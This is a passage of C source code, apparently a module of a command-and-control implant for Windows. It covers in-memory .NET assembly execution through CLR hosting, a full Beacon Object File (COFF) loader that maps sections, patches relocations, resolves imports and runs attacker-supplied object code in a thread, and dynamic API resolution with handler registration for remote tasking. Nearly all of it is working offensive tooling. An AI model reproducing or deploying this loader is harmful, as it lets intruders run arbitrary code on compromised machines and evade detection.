        SAFEARRAYBOUND outer_bound;
        VARIANT vInner;
        LONG idx = 0;

        outer_bound.lLbound = 0;
        outer_bound.cElements = 1;
        psaOuter = w.pSafeArrayCreate(VT_VARIANT, 1, &outer_bound);

        if (psaOuter != NULL)
        {
            w.pVariantInit(&vInner);
            V_VT(&vInner) = VT_ARRAY | VT_BSTR;

            SAFEARRAYBOUND empty_bound;
            empty_bound.lLbound = 0;
            empty_bound.cElements = 0;
            V_ARRAY(&vInner) = w.pSafeArrayCreate(VT_BSTR, 1, &empty_bound);

            w.pSafeArrayPutElement(psaOuter, &idx, &vInner);

            hr = pEntryPoint->lpVtbl->Invoke_3(pEntryPoint,
                     vEmpty, psaOuter, &vResult);

            w.pSafeArrayDestroy(psaOuter);
        }
        else
        {
            hr = pEntryPoint->lpVtbl->Invoke_3(pEntryPoint,
                     vEmpty, NULL, &vResult);
        }
    }

    if (psaArgs)
    {
        w.pSafeArrayDestroy(psaArgs);
    }

    w.pVariantClear(&vResult);

    if (FAILED(hr))
    {
        log_debug("* execute_assembly: Invoke_3 failed (0x%lx)\n",
                  (unsigned long)hr);
        goto ea_fail;
    }

    log_debug("* execute_assembly: invocation succeeded\n");

    if (pEntryPoint) ((IUnknown *)(void *)pEntryPoint)->lpVtbl->Release((IUnknown *)(void *)pEntryPoint);
    if (pAssembly) ((IUnknown *)(void *)pAssembly)->lpVtbl->Release((IUnknown *)(void *)pAssembly);
    if (pAppDomain) ((IUnknown *)(void *)pAppDomain)->lpVtbl->Release((IUnknown *)(void *)pAppDomain);
    pCorHost->lpVtbl->Stop(pCorHost);
    pCorHost->lpVtbl->Release(pCorHost);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

ea_fail:
    if (asm_data) free(asm_data);
    if (args_str) free(args_str);
    if (psaImage) w.pSafeArrayDestroy(psaImage);
    if (pEntryPoint) ((IUnknown *)(void *)pEntryPoint)->lpVtbl->Release((IUnknown *)(void *)pEntryPoint);
    if (pAssembly) ((IUnknown *)(void *)pAssembly)->lpVtbl->Release((IUnknown *)(void *)pAssembly);
    if (pAppDomain) ((IUnknown *)(void *)pAppDomain)->lpVtbl->Release((IUnknown *)(void *)pAppDomain);
    if (pCorHost)
    {
        pCorHost->lpVtbl->Stop(pCorHost);
        pCorHost->lpVtbl->Release(pCorHost);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
}

/* ================================================================== */
/*                                                                     */
/*  3. BOF (Beacon Object File) LOADER                                 */
/*                                                                     */
/* ================================================================== */

/* ---- Minimal COFF structures (x86-64 PE/COFF) ---- */

#pragma pack(push, 1)

typedef struct
{
    UINT16 Machine;
    UINT16 NumberOfSections;
    UINT32 TimeDateStamp;
    UINT32 PointerToSymbolTable;
    UINT32 NumberOfSymbols;
    UINT16 SizeOfOptionalHeader;
    UINT16 Characteristics;
} coff_file_header_t;

typedef struct
{
    char   Name[8];
    UINT32 VirtualSize;
    UINT32 VirtualAddress;
    UINT32 SizeOfRawData;
    UINT32 PointerToRawData;
    UINT32 PointerToRelocations;
    UINT32 PointerToLinenumbers;
    UINT16 NumberOfRelocations;
    UINT16 NumberOfLinenumbers;
    UINT32 Characteristics;
} coff_section_header_t;

typedef struct
{
    union
    {
        char ShortName[8];
        struct
        {
            UINT32 Zeros;
            UINT32 Offset;
        } LongName;
    } Name;
    UINT32 Value;
    UINT16 SectionNumber;
    UINT16 Type;
    UINT8  StorageClass;
    UINT8  NumberOfAuxSymbols;
} coff_symbol_t;

typedef struct
{
    UINT32 VirtualAddress;
    UINT32 SymbolTableIndex;
    UINT16 Type;
} coff_reloc_t;

#pragma pack(pop)

/* AMD64 relocation types */
#ifndef IMAGE_REL_AMD64_ADDR64
#define IMAGE_REL_AMD64_ADDR64  0x0001
#endif
#ifndef IMAGE_REL_AMD64_ADDR32NB
#define IMAGE_REL_AMD64_ADDR32NB 0x0003
#endif
#ifndef IMAGE_REL_AMD64_REL32
#define IMAGE_REL_AMD64_REL32   0x0004
#endif
#ifndef IMAGE_REL_AMD64_REL32_1
#define IMAGE_REL_AMD64_REL32_1 0x0005
#endif
#ifndef IMAGE_REL_AMD64_REL32_2
#define IMAGE_REL_AMD64_REL32_2 0x0006
#endif
#ifndef IMAGE_REL_AMD64_REL32_3
#define IMAGE_REL_AMD64_REL32_3 0x0007
#endif
#ifndef IMAGE_REL_AMD64_REL32_4
#define IMAGE_REL_AMD64_REL32_4 0x0008
#endif
#ifndef IMAGE_REL_AMD64_REL32_5
#define IMAGE_REL_AMD64_REL32_5 0x0009
#endif

#ifndef IMAGE_SCN_CNT_CODE
#define IMAGE_SCN_CNT_CODE              0x00000020
#endif
#ifndef IMAGE_SCN_CNT_INITIALIZED_DATA
#define IMAGE_SCN_CNT_INITIALIZED_DATA  0x00000040
#endif
#ifndef IMAGE_SCN_CNT_UNINITIALIZED_DATA
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080
#endif

#ifndef IMAGE_SYM_CLASS_EXTERNAL
#define IMAGE_SYM_CLASS_EXTERNAL 2
#endif
#ifndef IMAGE_SYM_CLASS_STATIC
#define IMAGE_SYM_CLASS_STATIC   3
#endif
#ifndef IMAGE_SYM_CLASS_SECTION
#define IMAGE_SYM_CLASS_SECTION  104
#endif

/* ---- BOF context ---- */

typedef struct
{
    unsigned char *raw;
    UINT32 raw_size;

    coff_file_header_t *header;
    coff_section_header_t *sections;
    coff_symbol_t *symbols;
    char *string_table;

    unsigned char **section_map;

    void **func_map;
    int func_count;
} bof_ctx_t;

static const char *bof_get_symbol_name(bof_ctx_t *ctx, coff_symbol_t *sym)
{
    if (sym->Name.LongName.Zeros == 0)
    {
        return ctx->string_table + sym->Name.LongName.Offset;
    }

    return sym->Name.ShortName;
}

static void *bof_resolve_external(const char *name)
{
    const char *sep;
    char module_name[128];
    HMODULE hMod;

    sep = strchr(name, '$');
    if (sep == NULL)
    {
        void *addr = (void *)w.pGetProcAddress(w.pGetModuleHandleA("kernel32.dll"), name);
        if (addr)
        {
            return addr;
        }
        addr = (void *)w.pGetProcAddress(w.pGetModuleHandleA("ntdll.dll"), name);
        return addr;
    }

    {
        size_t mod_len = (size_t)(sep - name);

        if (mod_len >= sizeof(module_name) - 5)
        {
            return NULL;
        }

        memcpy(module_name, name, mod_len);
        module_name[mod_len] = '\0';

        if (strstr(module_name, ".") == NULL)
        {
            strcat(module_name, ".dll");
        }
    }

    hMod = w.pGetModuleHandleA(module_name);
    if (hMod == NULL)
    {
        hMod = w.pLoadLibraryA(module_name);
    }

    if (hMod == NULL)
    {
        log_debug("* bof: cannot load module %s\n", module_name);
        return NULL;
    }

    return (void *)w.pGetProcAddress(hMod, sep + 1);
}

static int bof_load(bof_ctx_t *ctx, unsigned char *data, UINT32 size)
{
    UINT32 i;

    memset(ctx, 0, sizeof(*ctx));
    ctx->raw = data;
    ctx->raw_size = size;

    if (size < sizeof(coff_file_header_t))
    {
        log_debug("* bof: file too small\n");
        return -1;
    }

    ctx->header = (coff_file_header_t *)data;

    if (ctx->header->Machine != 0x8664)
    {
        log_debug("* bof: unsupported machine 0x%x (need AMD64)\n",
                  ctx->header->Machine);
        return -1;
    }

    ctx->sections = (coff_section_header_t *)(data + sizeof(coff_file_header_t) +
                     ctx->header->SizeOfOptionalHeader);

    ctx->symbols = (coff_symbol_t *)(data + ctx->header->PointerToSymbolTable);

    ctx->string_table = (char *)(ctx->symbols + ctx->header->NumberOfSymbols);

    ctx->section_map = (unsigned char **)calloc(
        ctx->header->NumberOfSections, sizeof(unsigned char *));

    if (ctx->section_map == NULL)
    {
        return -1;
    }

    for (i = 0; i < ctx->header->NumberOfSections; i++)
    {
        coff_section_header_t *sec = &ctx->sections[i];
        UINT32 alloc_size;

        alloc_size = sec->SizeOfRawData;
        if (sec->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
        {
            alloc_size = sec->VirtualSize > 0 ? sec->VirtualSize : sec->SizeOfRawData;
        }

        if (alloc_size == 0)
        {
            alloc_size = 16;
        }

        ctx->section_map[i] = (unsigned char *)w.pVirtualAlloc(
            NULL, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (ctx->section_map[i] == NULL)
        {
            log_debug("* bof: VirtualAlloc failed for section %d\n", i);
            return -1;
        }

        memset(ctx->section_map[i], 0, alloc_size);

        if (sec->SizeOfRawData > 0 && sec->PointerToRawData > 0)
        {
            if (sec->PointerToRawData + sec->SizeOfRawData > size)
            {
                log_debug("* bof: section %d raw data out of bounds\n", i);
                return -1;
            }

            memcpy(ctx->section_map[i],
                   data + sec->PointerToRawData,
                   sec->SizeOfRawData);
        }
    }

    return 0;
}

static int bof_relocate(bof_ctx_t *ctx)
{
    UINT32 i, j;

    for (i = 0; i < ctx->header->NumberOfSections; i++)
    {
        coff_section_header_t *sec = &ctx->sections[i];
        coff_reloc_t *relocs;

        if (sec->NumberOfRelocations == 0)
        {
            continue;
        }

        if (sec->PointerToRelocations + sec->NumberOfRelocations * sizeof(coff_reloc_t) >
            ctx->raw_size)
        {
            log_debug("* bof: relocation table out of bounds for section %d\n", i);
            return -1;
        }

        relocs = (coff_reloc_t *)(ctx->raw + sec->PointerToRelocations);

        for (j = 0; j < sec->NumberOfRelocations; j++)
        {
            coff_reloc_t *rel = &relocs[j];
            coff_symbol_t *sym;
            unsigned char *patch_addr;
            UINT64 sym_addr;

            if (rel->SymbolTableIndex >= ctx->header->NumberOfSymbols)
            {
                log_debug("* bof: reloc symbol index out of range\n");
                return -1;
            }

            sym = &ctx->symbols[rel->SymbolTableIndex];
            patch_addr = ctx->section_map[i] + rel->VirtualAddress;

            if (sym->SectionNumber > 0)
            {
                UINT16 sec_idx = sym->SectionNumber - 1;

                if (sec_idx >= ctx->header->NumberOfSections)
                {
                    log_debug("* bof: bad section number for symbol\n");
                    return -1;
                }

                sym_addr = (UINT64)(uintptr_t)(ctx->section_map[sec_idx] + sym->Value);
            }
            else if (sym->SectionNumber == 0 &&
                     sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL)
            {
                const char *name = bof_get_symbol_name(ctx, sym);
                void *addr;

                if (strncmp(name, "__imp_", 6) == 0)
                {
                    name += 6;
                }

                addr = bof_resolve_external(name);
                if (addr == NULL)
                {
                    log_debug("* bof: unresolved external: %s\n", name);
                    return -1;
                }

                sym_addr = (UINT64)(uintptr_t)addr;
            }
            else
            {
                log_debug("* bof: unhandled symbol section %d class %d\n",
                          sym->SectionNumber, sym->StorageClass);
                continue;
            }

            switch (rel->Type)
            {
                case IMAGE_REL_AMD64_ADDR64:
                    *(UINT64 *)patch_addr += sym_addr;
                    break;

                case IMAGE_REL_AMD64_ADDR32NB:
                    *(UINT32 *)patch_addr += (UINT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 4);
                    break;

                case IMAGE_REL_AMD64_REL32:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 4);
                    break;

                case IMAGE_REL_AMD64_REL32_1:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 5);
                    break;

                case IMAGE_REL_AMD64_REL32_2:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 6);
                    break;

                case IMAGE_REL_AMD64_REL32_3:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 7);
                    break;

                case IMAGE_REL_AMD64_REL32_4:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 8);
                    break;

                case IMAGE_REL_AMD64_REL32_5:
                    *(INT32 *)patch_addr += (INT32)(sym_addr -
                        (UINT64)(uintptr_t)patch_addr - 9);
                    break;

                default:
                    log_debug("* bof: unsupported reloc type 0x%x\n", rel->Type);
                    return -1;
            }
        }
    }

    /* Set code sections to executable */
    for (i = 0; i < ctx->header->NumberOfSections; i++)
    {
        coff_section_header_t *sec = &ctx->sections[i];

        if (sec->Characteristics & IMAGE_SCN_CNT_CODE)
        {
            DWORD old;
            UINT32 sz = sec->SizeOfRawData > 0 ? sec->SizeOfRawData : 16;

            w.pVirtualProtect(ctx->section_map[i], sz,
                              PAGE_EXECUTE_READ, &old);
        }
    }

    return 0;
}

typedef void (*bof_entry_t)(char *, int);

static void *bof_find_entry(bof_ctx_t *ctx)
{
    UINT32 i;

    for (i = 0; i < ctx->header->NumberOfSymbols; i++)
    {
        coff_symbol_t *sym = &ctx->symbols[i];
        const char *name;

        if (sym->SectionNumber <= 0)
        {
            i += sym->NumberOfAuxSymbols;
            continue;
        }

        name = bof_get_symbol_name(ctx, sym);

        if (strcmp(name, "go") == 0 || strcmp(name, "_go") == 0)
        {
            UINT16 sec_idx = sym->SectionNumber - 1;

            if (sec_idx >= ctx->header->NumberOfSections)
            {
                return NULL;
            }

            return (void *)(ctx->section_map[sec_idx] + sym->Value);
        }

        i += sym->NumberOfAuxSymbols;
    }

    return NULL;
}

static void bof_cleanup(bof_ctx_t *ctx)
{
    UINT32 i;

    if (ctx->section_map != NULL)
    {
        for (i = 0; i < ctx->header->NumberOfSections; i++)
        {
            if (ctx->section_map[i] != NULL)
            {
                w.pVirtualFree(ctx->section_map[i], 0, MEM_RELEASE);
            }
        }

        free(ctx->section_map);
    }

    if (ctx->func_map)
    {
        free(ctx->func_map);
    }
}

/* ---- BOF thread wrapper ---- */

typedef struct
{
    bof_entry_t fn;
    char *args;
    int alen;
} bof_thread_ctx_t;

static DWORD WINAPI bof_thread_proc(LPVOID param)
{
    bof_thread_ctx_t *tc = (bof_thread_ctx_t *)param;
    tc->fn(tc->args, tc->alen);
    return 0;
}

/* ---- BOF handler ---- */

static tlv_pkt_t *bof_execute(c2_t *c2)
{
    int obj_size;
    unsigned char *obj_data = NULL;
    unsigned char *args_data = NULL;
    int args_size;

    bof_ctx_t ctx;
    bof_entry_t entry;
    tlv_pkt_t *result;

    obj_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &obj_data);
    if (obj_size <= 0 || obj_data == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    args_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES + 1, &args_data);
    if (args_size < 0)
    {
        args_size = 0;
    }

    if (bof_load(&ctx, obj_data, (UINT32)obj_size) != 0)
    {
        log_debug("* bof: load failed\n");
        free(obj_data);
        if (args_data) free(args_data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (bof_relocate(&ctx) != 0)
    {
        log_debug("* bof: relocation failed\n");
        bof_cleanup(&ctx);
        free(obj_data);
        if (args_data) free(args_data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    entry = (bof_entry_t)bof_find_entry(&ctx);
    if (entry == NULL)
    {
        log_debug("* bof: entry point 'go' not found\n");
        bof_cleanup(&ctx);
        free(obj_data);
        if (args_data) free(args_data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    log_debug("* bof: executing entry at %p\n", (void *)entry);

    {
        bof_thread_ctx_t tc;
        HANDLE hThread;
        DWORD wait_result;

        tc.fn = entry;
        tc.args = (char *)args_data;
        tc.alen = args_size;

        hThread = w.pCreateThread(NULL, 0, bof_thread_proc, &tc, 0, NULL);
        if (hThread == NULL)
        {
            log_debug("* bof: CreateThread failed\n");
            bof_cleanup(&ctx);
            free(obj_data);
            if (args_data) free(args_data);
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        }

        wait_result = w.pWaitForSingleObject(hThread, 60000);
        w.pCloseHandle(hThread);

        if (wait_result == WAIT_TIMEOUT)
        {
            log_debug("* bof: execution timed out\n");
            bof_cleanup(&ctx);
            free(obj_data);
            if (args_data) free(args_data);
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        }
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    bof_cleanup(&ctx);
    free(obj_data);
    if (args_data) free(args_data);

    return result;
}

/* ================================================================== */
/* COT entry                                                           */
/* ================================================================== */

COT_ENTRY
{
    /* kernel32.dll */
    w.pLoadLibraryA        = (fn_LoadLibraryA)cot_resolve("kernel32.dll",
                                                          "LoadLibraryA");
    w.pGetProcAddress      = (fn_GetProcAddress)cot_resolve("kernel32.dll",
                                                             "GetProcAddress");
    w.pMultiByteToWideChar = (fn_MultiByteToWideChar)cot_resolve("kernel32.dll",
                                                                  "MultiByteToWideChar");
    w.pWideCharToMultiByte = (fn_WideCharToMultiByte)cot_resolve("kernel32.dll",
                                                                  "WideCharToMultiByte");
    w.pGetModuleHandleA    = (fn_GetModuleHandleA)cot_resolve("kernel32.dll",
                                                               "GetModuleHandleA");
    w.pVirtualAlloc        = (fn_VirtualAlloc)cot_resolve("kernel32.dll",
                                                           "VirtualAlloc");
    w.pVirtualFree         = (fn_VirtualFree)cot_resolve("kernel32.dll",
                                                          "VirtualFree");
    w.pVirtualProtect      = (fn_VirtualProtect)cot_resolve("kernel32.dll",
                                                              "VirtualProtect");
    w.pCreateThread        = (fn_CreateThread)cot_resolve("kernel32.dll",
                                                           "CreateThread");
    w.pWaitForSingleObject = (fn_WaitForSingleObject)cot_resolve("kernel32.dll",
                                                                   "WaitForSingleObject");
    w.pCloseHandle         = (fn_CloseHandle)cot_resolve("kernel32.dll",
                                                          "CloseHandle");

    /* ole32.dll */
    w.pCoInitializeEx = (fn_CoInitializeEx)cot_resolve("ole32.dll",
                                                       "CoInitializeEx");

    /* oleaut32.dll */
    w.pSafeArrayCreate       = (fn_SafeArrayCreate)cot_resolve("oleaut32.dll",
                                                                "SafeArrayCreate");
    w.pSafeArrayAccessData   = (fn_SafeArrayAccessData)cot_resolve("oleaut32.dll",
                                                                    "SafeArrayAccessData");
    w.pSafeArrayUnaccessData = (fn_SafeArrayUnaccessData)cot_resolve("oleaut32.dll",
                                                                      "SafeArrayUnaccessData");
    w.pSafeArrayDestroy      = (fn_SafeArrayDestroy)cot_resolve("oleaut32.dll",
                                                                 "SafeArrayDestroy");
    w.pSafeArrayPutElement   = (fn_SafeArrayPutElement)cot_resolve("oleaut32.dll",
                                                                    "SafeArrayPutElement");
    w.pSysAllocString        = (fn_SysAllocString)cot_resolve("oleaut32.dll",
                                                               "SysAllocString");
    w.pSysStringLen          = (fn_SysStringLen)cot_resolve("oleaut32.dll",
                                                             "SysStringLen");
    w.pSysFreeString         = (fn_SysFreeString)cot_resolve("oleaut32.dll",
                                                              "SysFreeString");
    w.pVariantInit           = (fn_VariantInit)cot_resolve("oleaut32.dll",
                                                           "VariantInit");
    w.pVariantClear          = (fn_VariantClear)cot_resolve("oleaut32.dll",
                                                             "VariantClear");

    /* msvcrt.dll */
    w.p_strdup = (fn__strdup)cot_resolve("msvcrt.dll", "_strdup");

    /* Register all handlers */
    api_call_register(api_calls, PS_EXECUTE, (api_t)ps_execute);
    api_call_register(api_calls, EXECUTE_ASSEMBLY_RUN, (api_t)execute_assembly_run);
    api_call_register(api_calls, BOF_EXECUTE, (api_t)bof_execute);
}

#endif
